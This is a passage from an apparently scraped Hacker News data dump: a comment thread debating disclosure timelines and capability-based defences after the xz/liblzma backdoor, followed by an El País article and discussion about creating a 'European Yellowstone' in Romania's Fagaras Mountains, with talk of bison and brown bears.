Just yesterday the author added a `SECURITY.md` file to the `xz-java` project. > If you discover a security vulnerability in this project please report it privately. *Do not disclose it as a public issue.* This gives us time to work with you to fix the issue before public exposure, reducing the chance that the exploit will be used before a patch is released. Reading that in a different light, it says give me time to adjust my exploits and capitalize on any targets. Makes me wonder what other vulns might exist in the author's other projects. reply ncr100 14 hours agoparentSecurity Researchers: Is this request-for-private-disclosure + \"90-days before public\" reasonable? It's a SEVERE issue, to my mind, and 90 days seems too long to me. reply cjbprime 13 hours agorootparentIn this particular case, there is a strong reason to expect exploitation in the wild to already be occurring (because it's an intentional backdoor) and this would change the risk calculus around disclosure timelines. But in the general case, it's normal for 90 days to be given for the coordinated patching of even very severe vulnerabilities -- you are giving time not just to the project maintainers, but to the users of the software to finish updating their systems to a new fixed release, before enough detail to easily weaponize the vulnerability is shared. Google Project Zero is an example of a team with many critical impact findings using a 90-day timeline. reply ang_cire 12 hours agorootparentAs someone in security who doesn't work at a major place that get invited to the nice pre-notification notifications, I hate this practice. My customers and business are not any less important or valuable than anyone else's, and I should not be left being potentially exploited, and my customers harmed, for 90 more days while the big guys get to patch their systems (thinking of e.g. Log4J, where Amazon, Meta, Google, and others were told privately how to fix their systems, before others were even though the fix was simple). Likewise, as a customer I should get to know as soon as someone's software is found vulnerable, so I can then make the choice whether to continue to subject myself to the risk of continuing to use it until it gets patched. reply hatter 10 hours agorootparent> My ... business are not any less ... valuable than anyone else's, Plainly untrue. The reason they keep distribution minimal is to maximise the chance of keeping the vuln secret. Your business is plainly less valuable than google, than walmart, than godaddy, than BoA. Maybe you're some big cheese with a big reputation to keep, but seeing as you're feeling excluded, I guess these orgs have no more reason to trust you than they have to trust me, or hundreds of thousands of others who want to know. If they let you in, they'd let all the others in, and odds are greatly increased that now your customers are at risk from something one of these others has worked out, and either blabbed about or has themselves a reason to exploit it. Similarly plainly, by disclosing to 100 major companies, they protect a vast breadth of consumers/customer-businesses of these major companies at a risk of 10,000,000/100 (or even less, given they may have more valuable reputation to keep). Changing that risk to 12,000,000/10,000 is, well, a risk they don't feel is worth taking. reply squeaky-clean 2 hours agorootparent> Your business is plainly less valuable than google, than walmart, than godaddy, than BoA. The company I work for has a market cap roughly 5x that of goDaddy and we're responsible for network connected security systems that potentially control whether a person can physically access your home, school, or business. We were never notified of this until this HN thread. If your BofA account gets hacked you lose money. If your GoDaddy account gets hacked you lose your domain. If Walmart gets hacked they lose... What money and have logistics issues for a while? Thankfully my company's products have additional safeguards and this isn't a breach for us. But what if it was? Our customers can literally lose their lives if someone cracks the security and finds a way to remotely open all the locks in their home or business. Don't tell me that some search engine profits or someone's emails history is \"more valuable\" than 2000 schoolchildren's lives. How about you give copies of the keys to your apartment and a card containing your address to 50 random people on the streets and see if you still feel that having your Gmail account hacked is more valuable. reply freedomben 11 hours agorootparentprevBeing in a similar boat, I heartily agree. But I don't want anyone else to get notified immediately because the odds that somebody will start exploiting people before a patch is available is pretty high. Since I can't have both, I will choose the 90 days for the project to get patches done and all the packagers to include them and make them available, so that by the time it's public knowledge I'm already patched. I think this is a Tragedy of the Commons type of problem. Caveat: This assume the vuln is found by a white hat. If it's being exploited already or is known to others, then I fully agree the disclosure time should be eliminated and it's BS for the big companies to get more time than us. reply cjbprime 12 hours agorootparentprevOpenSSL's \"notification of an upcoming critical release\" is public, not private. You do get to know that the vulnerability exists quickly, and you could choose to stop using OpenSSL altogether (among other mitigations) once that email goes out. reply sidewndr46 8 hours agorootparentif your system has already been compromised at the root level, it does not matter in the least bit reply Thorrez 5 hours agorootparentWell if you assume everyone has already been exploited, disclosing quickly vs slowly won't prevent that. Also, if something is being actively exploited, usually there's no or very little embargo. reply wyldberry 12 hours agorootparentprevI empathize with this as I've been in the same boat, but all entities are not equal when performing triage. reply oceanplexian 11 hours agorootparentprevYeah I worked in FAANG when we got the advance notice of a number of CVEs. Personally I think it's shady, I don't care how big Amazon or Google is, they shouldn't get special privileges because they are a large corporation. reply kelnos 4 hours agorootparentI don't think the rationale is that they are a large corporation or have lots of money. It's that they have many, many, many more users that would be affected than most companies have. reply voidfunc 3 hours agorootparentprev> My customers and business are not any less important or valuable than anyone else's Hate to break it to you but yes they are. reply umanwizard 8 hours agorootparentprev> My customers and business are not any less important or valuable than anyone else's Of course they are. If Red Hat has a million times more customers than you do then they are collectively more valuable almost by definition. reply InvertedRhodium 8 hours agorootparentIf OP is managing something that is critical to life - think fire suppression controllers, or computers that are connected to medical equipment, I think it becomes very difficult to compare that against financial assets. reply ajdlinux 1 hour agorootparentAt a certain scale, \"economic\" systems become critical to life. Someone who has sufficiently compromised a systemically-important bank can do things that would result in riots breaking out on the street all over a country. reply codedokode 27 minutes agorootparentprevSomething that is critical to life should not be connected to Internet. reply solarengineer 4 hours agorootparentprevI can think of two approaches for such companies: a. Use commercial OS vendors who will push out fixes. b. Set up a Continuous Integration process where everything is open source and is built from the ground up, with some reliance on open source platforms such as distros. One needs different types of competence and IT Operational readiness in each approach. reply squeaky-clean 2 hours agorootparent> b. Set up a Continuous Integration process where everything is open source and is built from the ground up, with some reliance on open source platforms such as distros. How would that have prevented this backdoor? reply jen20 4 hours agorootparentprevSuch systems should be airgapped… reply bawolff 13 hours agorootparentprevWhether its reasonable is debatable, but that type of time frame is pretty normal for things that aren't being actively exploited. This situation is perhaps a little different as its not an accidental bug waiting to be discovered but an intentionally placed exploit. We know that a malicious person already knows about it. reply larschdk 12 hours agorootparentDetecting a security issue is one thing. Detecting a malicious payload is something completely different. The latter has intent to exploit and must be addressed immediately. The former has at least some chance of noone knowing about it. reply londons_explore 12 hours agorootparentprevIf you were following Google Project Zero's policy (which many researchers do), any in-the-wild exploits would trigger an immediate reveal. reply sterlind 12 hours agorootparentprevI think you have to take the credibility of the maintainer into account. If it's a large company, made of people with names and faces, with a lot to lose by hacking its users, they're unlikely to abuse private disclosure. If it's some tiny library, the maintainers might be in on it. Also, if there's evidence of exploitation in the wild, the embargo is a gift to the attacker. The existence of a vulnerability in that case should be announced, even if the specifics have to be kept under embargo. reply fmajid 12 hours agorootparentIn this case the maintainer is the one who deliberately introduced the backdoor. As Andres Freund puts it deadpan, \"Given the apparent upstream involvement I have not reported an upstream bug.\" reply BartjeD 3 hours agorootparentprevThe fraudulent author must have enjoyed the 'in joke' -- He's the one create vulnerabilities.. reply decoy78 11 hours agorootparentprevimho it depends on the vuln. I've given a vendor over a year, because it was a very low risk vuln. This isn't a vuln though - this is an attack. reply sidewndr46 8 hours agorootparentprevI've always laughed my ass off at the idea of a disclosure window. It takes less than a day to find RCE that grants root privileges on devices that I've bothered to look at. Why on earth would I bother spending months of my time trying to convince someone to fix something? reply xyst 15 hours agoparentprev90 day dark window for maintainers is SOP though. Then after 90 days, it’s free game for public disclosure reply szundi 14 hours agoparentprevHow many of people like this one exist? reply ldayley 13 hours agorootparentIf this question had a reliable (and public) answer then the world would be a very different place! That said, this is an important question. We, particularly those us who work on critical infrastructure or software, should be asking ourselves this regularly to help prevent this type of thing. Note that it's also easy (and similarly catastrophic) to swing too far the other way and approach all unknowns with automatic paranoia. We live in a world where we have to trust strangers every day, and if we lose that option completely then our civilization grinds to a halt. But-- vigilance is warranted. I applaud these engineers who followed their instincts and dug into this. They all did us a huge service! EDIT: wording, spelling reply josephg 11 hours agorootparentYeah thanks for saying this; I agree. And as cliche as it is to look for a technical solution to a social problem, I also think better tools could help a lot here. The current situation is ridiculous - if I pull in a compression library from npm, cargo or Python, why can that package interact with my network, make syscalls (as me) and read and write files on my computer? Leftpad shouldn’t be able to install crypto ransomware on my computer. To solve that, package managers should include capability based security. I want to say “use this package from cargo, but refuse to compile or link into my binary any function which makes any syscall except for read and write. No open - if I want to compress or decompress a file, I’ll open the file myself and pass it in.” No messing with my filesystem. No network access. No raw asm, no trusted build scripts and no exec. What I allow is all you get. The capability should be transitive. All dependencies of the package should be brought in under the same restriction. In dynamic languages like (server side) JavaScript, I think this would have to be handled at runtime. We could add a capability parameter to all functions which issue syscalls (or do anything else that’s security sensitive). When the program starts, it gets an “everything” capability. That capability can be cloned and reduced to just the capabilities needed. (Think, pledge). If I want to talk to redis using a 3rd party library, I pass the redis package a capability which only allows it to open network connections. And only to this specific host on this specific port. It wouldn’t stop all security problems. It might not even stop this one. But it would dramatically reduce the attack surface of badly behaving libraries. reply Guvante 9 hours agorootparentDoesn't this exact exploit not fixed by your capability theory? It is hijacking a process that has network access at runtime not build time. The build hack grabs files from the repo and inspects build parameters (in a benign way, everyone checks whether you are running on X platform etc) reply josephg 3 hours agorootparentThe problem we have right now is that any linked code can do anything, both at build time and at runtime. A good capability system should be able to stop xz from issuing network requests even if other parts of the process do interact with the network. It certainly shouldn't have permission to replace crc32_resolve() and crc64_resolve() via ifunc. Another way of thinking about the problem is that right now every line of code within a process runs with the same permissions. If we could restrict what 3rd party libraries can do - via checks either at build time or runtime - then supply chain attacks like this would be much harder to pull off. reply im3w1l 1 hour agorootparentI'm not convinced this is such a cure-all as any library must necessarily have the ability to \"taint\" its output. Like consider this library. It's a compression library. You would presumably trust it to decompress things right? Like programs? And then you run those programs with full permission? Oops.. reply josephg 25 minutes agorootparentIt’s not a cure-all. I mean, we’re talking about infosec - so nothing is. But that said, barely any programs need the ability to execute arbitrary binaries. I can’t remember the last time I used eval() in JavaScript. I agree that it wouldn’t stop this library from injecting backdoors into decompressed executables. But I still think it would be a big help anyway. It would stop this attack from working. At the big picture, we need to acknowledge that we can’t implicitly trust opensource libraries on the internet. They are written by strangers, and if you wouldn’t invite them into your home you shouldn’t give them permission to execute arbitrary code with user level permissions on your computer. I don’t think there are any one size fits all answers here. And I can’t see a way to make your “tainted output” idea work. But even so, cutting down the trusted surface area from “leftpad can cryptolocker your computer” to “Leftpad could return bad output” sounds like it would move us in the right direction. reply Bulat_Ziganshin 5 hours agorootparentprevif I got it right, the attack uses glibc IFUNC mechanism to patch sshd (and only sshd) to directly run some code in liblzma when sshd verifies logins. so the problem is IFUNC mechanism, which has its valid uses but can be EASILY misused for any sort of attacks reply josephg 3 hours agorootparentHonestly, I don't have a lot of hope that we can fix this problem for C on linux. There's just so much historical cruft in present, spread between autotools, configure, make, glibc, gcc and C itself that would need to be modified to support capabilities. The rule we need is \"If I pull in library X with some capability set, then X can't do anything not explicitly allowed by the passed set of capabilities\". The problem in C is that there is currently no straightforward way to firewall off different parts of a linux process from each other. And dynamic linking on linux is done by gluing together compiled artifacts - with no way to check or understand what assembly instructions any of those parts contain. I see two ways to solve this generally: - Statically - ie at compile time, the compiler annotates every method with a set of permissions it (recursively) requires. The program fails to compile if a method is called which requires permissions that the caller does not pass it. In rust for example, I could imagine cargo enforcing this for rust programs. But I think it would require some changes to the C language itself if we want to add capabilities there. Maybe some compiler extensions would be enough - but probably not given a C program could obfuscate which functions call which other functions. - Dynamically. In this case, every linux system call is replaced with a new version which takes a capability object as a parameter. When the program starts, it is given a capability by the OS and it can then use that to make child capabilities passed to different libraries. I could imagine this working in python or javascript. But for this to work in C, we need to stop libraries from just scanning the process's memory and stealing capabilities from elsewhere in the program. reply saalweachter 10 hours agorootparentprevAssume 3% of the population is malicious. Enough to be cautious, enough to think about how to catch bad actors, not so much as to close yourself off and become a paranoid hermit. reply pizzafeelsright 8 hours agorootparentHuh. I never really thought of it as a percentage. I've been evil, been wonderful, and indifferent at different stages in life. I have known those who have done similar for money, fame, and boredom. I think, given a backstory, incentive, opportunity, and resources it would be possible to most people to flip from wouldn't to enlisted. Leverage has shown to be the biggest lever when it comes to compliance. reply XorNot 7 hours agorootparentIt's doubtful you've been evil, or at least, you are really lacking in imagination of the true scope of what that word implies. reply saulpw 5 hours agorootparentprev\"Assume that 3% of the people you encounter will act maliciously.\" reply mlsu 5 hours agorootparentprevThe line between good and evil cuts through the heart of every person reply heresie-dabord 10 hours agorootparentprevThreat actors create personas. We will need strong social trust to protect our important projects and dependencies. reply tw04 14 hours agoparentprevHonestly it seems like a state-based actor hoping to get whatever high value target compromised before it's made public. Reporting privately buys them more time, and allows them to let handlers know when the jig is up. reply 980 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The Openwall project provides free and open-source products for server security, such as a Linux OS, password cracker, and password hashing tools.",
      "A backdoor was discovered in the xz/liblzma package, impacting SSH servers on glibc-based x86-64 Linux systems, creating a risk of unauthorized access or remote code execution.",
      "Exploit code is targeting specific libraries, prompting distributions like Debian and Red Hat to address the issue; vulnerable systems need urgent upgrades."
    ],
    "commentSummary": [
      "A backdoor in upstream xz/liblzma led to compromises of SSH servers, resulting in account suspensions and the removal of the author's key from repositories, sparking discussions on code complexity and potential state actor involvement in open-source projects.",
      "Concerns raised about XZ file format security in enterprise Linux distributions lacking immediate updates, emphasizing the importance of multi-factor authentication with methods like YubiKeys and storing TOTP recovery passwords for emergencies.",
      "Debates on the effectiveness of two-factor authentication, limitations of MFA, risks of storing passwords and tokens on the same device, discussions on Passkeys implementation, hardware keys for authentication, and transparency in coding practices, along with the community's call for vigilance and prompt security vulnerability addressing."
    ],
    "points": 3513,
    "commentCount": 1252,
    "retryCount": 0,
    "time": 1711729010
  },
  {
    "id": 39864412,
    "title": "Philanthropist creates 'European Yellowstone' in Romania",
    "originLink": "https://english.elpais.com/international/2024-03-29/philanthropist-group-buys-up-large-tracts-of-land-in-romania-to-create-european-yellowstone.html",
    "originBody": "BIODIVERSITY Philanthropist group buys up large tracts of land in Romania to create ‘European Yellowstone’ Local residents who at first suspected gold or uranium deposits had been found are being won over by the initiative to protect nature and economically develop the areas involved Virgin forest in the Carpathian Mountains in Romania. SANDRA BARTOCHA RAÚL SÁNCHEZ COSTA Bucharest - MAR 29, 2024 - 13:50UPDATED MAR 29, 2024 - 16:22 CET “It has to be an ambitious conservation project,” Hansjörg Wyss, one of the world’s leading environmental philanthropists, told Christoph and Barbara Promberger, promoters of the Foundation Conservation Carpathia, as a condition for financing the purchase of land in Romania, a country that today contains 65% of Europe’s virgin forests. The aim is to create “the European Yellowstone,” as the largest donor of the initiative described it after flying over the enormous expanse of the Fagaras Mountains, located in the extreme south of the Carpathian range, in a helicopter. So far, the foundation has already bought up 27,027 hectares in this still wild region, but the goal is to create a gigantic protected area of 200,000 hectares, an area roughly equivalent to the North Cascades National Park in Washington. This area of Transylvania is home to one of the most important wildlife ecosystems in Europe. Wolves and brown bears — of the latter there are more than 5,000 in the country — lynx and beavers roam freely on the forested slopes of the Fagaras Mountains, the highest in the southern Carpathians. Several years ago, 80 bison were reintroduced two centuries after their disappearance from these territories, through a program run by the Foundation Conservation Carpathia. It all started in the mid-2000s when the Prombergers noticed the illegal logging that was still taking place in the Romanian forests, spurred by the restitution of woodlands to former owners from the pre-communist era. Illegal deforestation even spilled over into state-protected parks, such as Piatra Craiului — meaning The King’s Rock — one of the most popular in the country due to its immense variety of flora and fauna. It is estimated there are some 5,000 wild bears in Romania. CALIN SERBAN “‘Only if someone buys these forests and places them in private hands can we save them, at least until the state realizes the importance of preserving them,’ the director of a national park jokingly let slip,” says Barbara Promberger. At that point, the Austrian biologist and her husband Cristoph, a German forester, set out to find philanthropists and conservationists to raise funds to buy large tracts of forest to halt deforestation and, at the same time, promote ecotourism in support of local communities. “This national park has to serve to protect nature, but also to economically develop the areas involved,” says Barbara, who has lived in a tiny village in Brasov province for 30 years. As a conservation model, they were inspired by the Tompkins project launched in the 1990s to restore habitats in southern Chile and Argentina, and also by the Bavarian Forest National Park. The 27,027 hectares they have acquired to date have been included in Romania’s National Catalog of Virgin and Quasi-Virgin Forests to protect them in perpetuity. The foundation has also reforested almost 2,000 hectares and replanted more than four million young trees such as beech, spruce and maple. Today, Romania has more than six million hectares of forest, a significant proportion of which is free of human settlement. But illegal logging has already wreaked havoc on vast tracts. For this reason, the organization’s rangers are patrolling some 75,000 hectares to stop illegal logging in neighboring forests as well. The project aims to involve the inhabitants of the small villages, located in the foothills of the Fagaras Mountains, by providing jobs and gradually attracting more visitors to the area, as well as developing educational and social programs. However, the creation of the Fagaras National Park requires the agreement of the affected local authorities. This is where the Foundation Conservation Carpathia is encountering difficulties. “We are in a post-communist country, so people are wary of losing their property again to the state,” explains Barbara, who stresses that the fact that national parks have been set up without infrastructure has led to locals “being left with access restrictions and no economic benefits, which has increased the general rejection. We can only buy from private property, but not from municipalities or landowners’ associations, so our strategy is to acquire what we can and donate it to the state only if it creates a national park,” says the biologist. The Fagaras Mountains, at the southern tip of the Carpathians. DAN DINU The perception of the villagers in the 28 local communities has changed a lot over the years, but it is still the main challenge to overcome. At first, residents prejudged the foundation members as outsiders who wanted to earn significant income at the expense of their land. “They suspected that we had found gold or uranium; they couldn’t imagine that we would invest so much money to preserve nature alone,” says Barbara, who expects her residents to submit a formal request to the Romanian government in the next five to 10 years to turn their area into one of Europe’s largest nature reserves. On the other hand, there are still localities that are resisting. “We believe it is due to the logging lobbies. Since they have been threatened, these groups that illegally cut the forests have started to create fake news about us, such as that we are going to throw snakes from an airplane, close access to the forests, or cut down the trees,” says Victoria Donos, the foundation’s director of communication and local community relations. “They don’t understand that there really is someone who wants to do good without any interest in return,” adds the activist, who specifies that it will be a park without restrictions with a protected area and another for economic development. Bison have been reintroduced to the area. CALIN SERBAN As another innovative measure, the foundation created its own hunters’ association and acquired the hunting rights to 80,000 hectares to protect wildlife, as poaching was especially damaging the herds of chamois and deer. “There is significant opposition from hunters; they perceive us as a danger because we support a quota established under scientific reason to avoid endangering wildlife and the existence of a species,” Donos says. On the outskirts of the commune of Leresti, which has about 4,500 inhabitants, 28 bison were reintroduced two years ago, which will soon lead to the opening of a bison observation center to attract tourists and further revitalize the area. “Over time, the inhabitants have understood what Carpathia wants to do,” says Marian Toader, mayor of Leresti, who says the area has become a tourist resort of local interest in just a few months. The foundation already owns 3,200 of the commune’s 15,000 hectares, says the mayor, who has seen how the outlying villages of the Bavarian Forest National Park have benefited. “In addition, it has helped us to keep bears away from residents’ houses, a problem that used to occur on a daily basis, by building electric fences,” concludes Toader. Sign up for our weekly newsletter to get more English-language news coverage from EL PAÍS USA Edition More information The crossing of ‘El Jefe’: Famed jaguar circumvents US-Mexico border wall Andrea J. ArratibelMexico Dutch foundation funds large-scale project to rewild deserted area of Spain Clemente ÁlvarezMadrid Archived In Transilvania ClimateTrade Adheres to More information If you are interested in licensing this content, please contact ventacontenidos@prisamedia.com newsletter Sign up to EL PAÍS in English Edition bulletin APÚNTATE Most viewed Philanthropist group buys up large tracts of land in Romania to create ‘European Yellowstone’ ‘Pink cocaine’: The expensive and trendy drug is neither cocaine nor high quality Jim Caviezel: ‘All of a sudden, I wasn’t popular anymore just for playing Jesus’ ‘Gringo go home’: Mexico City’s housing crisis precedes digital nomads No, pork rinds are not healthier than vegetables, and there is no study that proves it",
    "commentLink": "https://news.ycombinator.com/item?id=39864412",
    "commentBody": "Group buys up large tracts of land in Romania to create 'European Yellowstone' (elpais.com)268 points by geox 19 hours agohidepastfavorite216 comments Fricken 17 hours ago>Several years ago, 80 bison were reintroduced two centuries after their disappearance from these territories... I had no idea there were bison in Europe. The provided hyperlink leads to an article about bison being reintroduced in Mexico. Here is an appropriate article about bison being rewilded in the Southern Carpathians: https://rewildingeurope.com/blog/free-roaming-bison-populati.... reply adrian_b 3 hours agoparent\"Bison\" is an European word (with several variants like \"Wisent\"), so it makes sense that originally it was the name of an European animal. It became applied to the American bison when the American colonists have encountered an animal similar to the one known by them in Europe. The European bison is a distinct species from the American bison. In the more distant past bisons were widespread all over the Northern Eurasia and Northern America. They have been preferentially hunted everywhere, so their populations have dwindled and fragmented, becoming isolated, then they have become differentiated. The European bison is somewhat smaller (because it had been mainly a forest animal) and it had become completely extinct in the wild a century ago. Fortunately, there were enough captive, which have been bred and then reintroduced in the wild in some of their former territories, e.g. in Poland and Romania. reply 1vuio0pswjnm7 10 hours agoparentprevRomanian postage stamp from 2001: https://upload.wikimedia.org/wikipedia/commons/0/05/Romania_... https://www.newyorker.com/magazine/2008/06/23/first-impressi... Also check out Herzog's 2010 documentary \"Cave of Forgotten Dreams\" The nonstop gibberish about \"AI\" bores me to tears. These paintings suggest a different view of what it means to become \"conscious\". http://www.tcnj.edu/~library/e-reserve/shestakow/SHESHAAH105... reply lancesells 9 hours agorootparentCave of Forgotten Dreams really moved me. I know part of it is Herzog's narration but it was something about the age of the drawings and thinking of the people creating them as either decoration or maybe storytelling. reply auselen 15 hours agoparentprevI’ve read about them after getting introduced to: https://en.m.wikipedia.org/wiki/Żubrówka reply jnurmine 15 hours agorootparentI am of the firm belief that this drink, mixed with apple juice, should be marked as Unesco world heritage already. reply dflock 56 minutes agorootparentApple Pie Vodka is the best... so many hangovers! reply lukan 14 hours agorootparentprevI never tried that combination (I also drink very rarely), but it sounds interesting .. and I do like the bison grass vodka on its own. reply renegade-otter 14 hours agorootparentprevThere is bison in Chernobyl: https://www.rferl.org/a/bison-chernobyl/28357813.html reply Rinzler89 14 hours agorootparentThere is almost every EurAsian animal in Chernobyl. Once humans fucked off, animals took over. reply _heimdall 6 hours agorootparentThe real lesson is that humans don't need to fuck off for this to happen, we just need to stop intervening so much in nature. People honestly can't seem to handle sitting idle, we run around doing as much stuff as we can because we don't know what \"enough\" means. reply Cthulhu_ 10 hours agorootparentprevThis happened very quickly during the early panny-D as well reply yread 14 hours agorootparentprevThere is also the beer https://zubr.cz/cs reply KptMarchewa 10 hours agorootparentAnd probably unrelated polish beer zubr.pl reply Maken 13 hours agoparentprevPrehistoric European cave paintings should make that obvious. reply ReleaseCandidat 16 hours agoparentprevYes, there are some of them in various european countries. https://www.eurowildlife.org/news/wisents-in-slovakia-the-po... https://en.m.wikipedia.org/wiki/European_bison reply fuzztester 8 hours agoparentprev>I had no idea there were bison in Europe. I've been on nodding terms with these guys for some years: https://en.m.wikipedia.org/wiki/Gaur reply m463 14 hours agoparentprevIt would be interesting to compare population density of europe vs the rest of the world over history. I have imagined that europe was always heavily populated, while north america was sparsely populated (allowing endless bison). Might not be that true, maybe europe wasn't that dense, and also disease killed so many when the first europeans arrived. reply svachalek 14 hours agorootparentContact with Europeans spread new diseases that killed off the vast majority of the Native American population. So it's likely Europe was more populated but not to the degree that settlers found here -- they were moving into a post-apocalyptic wasteland. reply rrrrrrrrrrrryan 8 hours agorootparentprev> I have imagined ... north america was sparsely populated (allowing endless bison) The \"endless bison\" in America was actually only during a relatively short period of time. IIRC there was a gap of almost a century between when the Native American population was decimated due to disease, and when settlers of European ancestry headed out west. During that gap the bison population exploded. reply pchristensen 6 hours agorootparentprevThe book 1493: Uncovering the New World Columbus Created goes into a lot of detail about this. reply panick21_ 14 hours agorootparentprevThe US used to have many competitors to the bison. Many different kind of larger bison. Different types of horses. Giant sloths and so on. The European Northern plane just turned more into forest rather then remaining more open. reply petre 3 hours agoparentprevIt's another species, wisent, zubr, zimbru: https://en.m.wikipedia.org/wiki/European_bison reply keiferski 17 hours agoprevOf particular note is that there are a ton of bears in Romania, much more than in other European countries, with something like 60% of all European brown bears. [0] Glad to see that someone is attempting to preserve this. 0. https://www.mossy.earth/rewilding-knowledge/romanias-brown-b... reply ReleaseCandidat 16 hours agoparent> much more than in other European countries, with something like 60% of all European brown bears. There are about 5000 (even it it were 10,000) in Romania, which is way less than 50% of the european population. https://www.euronatur.org/en/what-we-do/bear-wolf-lynx/bears... reply keiferski 15 hours agorootparentI don't see any numbers in the link you provided. Edit: I looked again and I think you're referring to the image. It looks like the link I referenced was excluding Russia. Romania does seem to have 60% of bears everywhere in Europe west of Russia and parts of Finland and Estonia. reply ReleaseCandidat 15 hours agorootparentRomania has about 5000, Slovakia and Ukraine about 2000 about 4000 from Ex-Yugoslavia to Greece and 2500 in Scandinavia. So, still way less than 50%. reply keiferski 15 hours agorootparentI think the confusion might be because the Carpathian zone includes Romania, Slovakia, and Ukraine, and the site I linked to is using that number solely for Romania. In any case, it's not my website and the general point remains that the specific region has a big percentage of European bears. reply ReleaseCandidat 14 hours agorootparentI didn't want to critisize you, just to get the numbers straight. I'm actually living in one of the regions with many bears (the northern end of the lower tatras) in Slovakia. reply nottorp 17 hours agoparentprevThere are more bears than the land can sustain. Go to any tourist (or non tourist) spot in the mountains and they'll come down and steal from your garbage in town. Look up Brasov. It's a reasonably large touristic town and it regularly gets bears at the periphery. reply pfdietz 17 hours agorootparentBears are common in western US mountain towns. The solution is being careful with garbage, including use of bear-proof containers. I'm not sure this is a sign of \"too many\" so much as that the bear population is healthy, meaning it's up against the carrying capacity, as a healthy population should be. reply 1letterunixname 11 hours agorootparentMy mom lived in Paradise, CA. There was at least one black bear who roamed the neighborhood because it took a dump in the middle of her lawn to proclaim ownership of their land. According to neighbors, it didn't get into garbage containers there. There were red foxes, opossum, deer, and corvids to do that. In parts of rural, wooded America, you don't venture outside in situations where you could surprise a large animal without some sort of stabby weapon or firearm if you value your life (if they decide to charge) and that of critters (to try to scare them off). reply vikramkr 15 hours agorootparentprevThe land can sustain them fine, that's just what it's like to live near bears. Tons of places are like that - you get used to it lol don't worry. There was a Tom Scott video on work folks are doing to develop bear resistant trash cans and the like: https://youtu.be/Xn_O2li_jpk?si=BUPxDOxXaOJdxC_v It's funny (and sad) that wildlife has been so thoroughly decimated in parts of the world that people are so shocked by such thoroughly mundane things but it's an important reminder that ecological restoration work must involve working with locals and understanding the cultural forces at play to make these projects a success. Including making sure that externalities are accounted for and that the people in the area share in the benefits (economic like tourism, cultural like restoration of culturally significant animals and ecosystems, environmental depending on the intrinsic value people give to preserving the environment, etc). I'm seeing it in the replies to this thread - it's easy for folks in places like the American West to be dismissive of concerns like these but the idea that the wild is worth preserving is frankly a relatively recent one. If you just assume that obviously everyone values bears being alive while the other person just assumes that everyone values eliminating or at least suppressing bear populations to never have to deal with them everyone is just going to walk away assuming the other person is crazy reply mistrial9 9 hours agorootparent> the idea that the wild is worth preserving is frankly a relatively recent one not entirely inaccurate, but an important distinction. People who had pre-industrial cultures (and probably some relationship to wild places) were systematically conquered and their lands taken, by militarized industrial civilizations.. this happened at various times in various places in the last 500 years. There are no places of note left that have not been treated this way. So a preservation relationship to wild places among the civilizations established by military conquer, is relatively new.. agree reply vikramkr 8 hours agorootparentGood point. The core of what i'm trying to get at with that statement is - in many of the regions where ecological restoration is a topic of conversation, stakeholders with power over restoration would only recently have begun to interact with the idea of ecological restoration being valuable in a way they have to take seriously (people have been fighting for the environment forever, but people with power to influence that caring about it is going to be novel), and are often coming from a perspective where the opposite, the exploitation of the environment as a desirable goal for mankind, has been mainstream for a long time. reply larrik 17 hours agorootparentprevI live in a regular town in Connecticut and I have bears attack my garbage regularly, so I'm not convinced that's all that weird. reply miahi 16 hours agorootparentUnfortunately, Romanian bears are brown bears (Ursus arctos), not black (Ursus americanus). They are not easily scared by people and encounters with them can be very dangerous. reply bwanab 16 hours agorootparentI understand the difference, but if you find yourself inadvertently getting between a black bear and her cubs, I think you'll find they can be very dangerous, also. reply larrik 13 hours agorootparentprevUnlike the other commenters, I do agree that IS different. The black bears here are not on the same level as a grizzly or kodiak or other brown bear. The ones here ARE becoming a bit more aggressive for unknown reasons, though. reply rsdfdfdfdf 15 hours agorootparentprevI don't think there's a much difference in behavior between the species, probably Romania just has more bears living close to humans, which makes them less afraid and conflicts more likely. For the record, my home country (Finland) has about 2000 brown bears, and they have killed only a single person during past 100 years. Most of the time they try their best to avoid humans, and the majority of people living in the countryside have never even seen one. reply lukan 14 hours agorootparentRomania has more than 2 persons killed each year and many more injured. \"Between 2016 and 2021, there were 154 bear attacks on humans, resulting in 158 injuries and 14 deaths\" https://www.politico.eu/article/romania-bear-attacks-on-huma... reply Rinzler89 13 hours agorootparent>Romania has more than 2 persons killed each year and many more injured. Statistics can be misleading without context. Especially when you see dumbfucks in Romania film themselves pulling over and get out of their cars so they can get close to bears to feed them biscuits and pet them as if they're stray cats/dogs. How can you blame the bears then? At that point such deaths are just natural selection at work. At least in the past when we were cavemen, some member of the tribe would get mauled by a wild animal and the rest of the tribe would take note not to fuck around with those animals and pass that knowledge to their offspring, but somewhere along the way, we seem to have lost commons sense and personal responsibility and if some idiot engages with a wild animal and gets killed it's now the animal's fault for being \"dangerous\" and not his fault for being a dumbass who's now been thankfully erased from the gene pool. reply lukan 2 minutes agorootparent\"At least in the past when we were cavemen, some member of the tribe would get mauled by a wild animal and the rest of the tribe would take note not to fuck around with those animals\" Yes they learned, but also most tribes would have taken pride in hunting that animal down. At least that was (and is) the case with indigenous tribes where we have detail knowldege. So the animals learned to stay away from the humans (to some extent). But yes, we advanced a little bit, so we do have other options. The finns seem to do way better in this regard, than rumania. About the reasons why they do better, I lack detail knowledge. \"Especially when you see dumbfucks in Romania film themselves pulling over and get out of their cars so they can get close to bears to feed them biscuits and pet them as if they're stray cats/dogs\" But if this behavior is widespread, then yeah, this would be certainly a reason. And stray dogs can be quite dangerous as well btw. olddustytrail 13 hours agorootparentprevJust for comparison, how many persons are killed by humans each year? reply BodyCulture 13 hours agorootparentprevThere you have it! Romanian people taste much better than Finish! reply pvaldes 13 hours agorootparentprevI bet that a fair quote of them were hunting bears reply lupusreal 11 hours agorootparentprevEurasian brown bears and North American brown bears are ostensibly the same species of bear, but you'd never guess it from the attack statistics. Eurasian brown bears are considerably less likely to attack than their North American counterparts. I think the Eurasian brown bears have been subjected to more evolutionary pressure to be more docile (from people hunting down the aggressive ones more comprehensively and probably for longer than in America.) reply keiferski 17 hours agorootparentprevI don't know much about the particular situation, but isn't it likely that is just caused from human settlements expanding? reply rickydroll 16 hours agorootparentprevSpeaking of bears, a bunch of libertarians took over Grafton NH, and the bears won. https://www.vox.com/policy-and-politics/21534416/free-state-... reply exe34 16 hours agorootparentprevAre you sure it's the bears that are invading or is it the monkeys with their stick technology? reply seattle_spring 10 hours agorootparentprevA bear stealing human food in no way shape or form suggests that there's not enough food for them in the 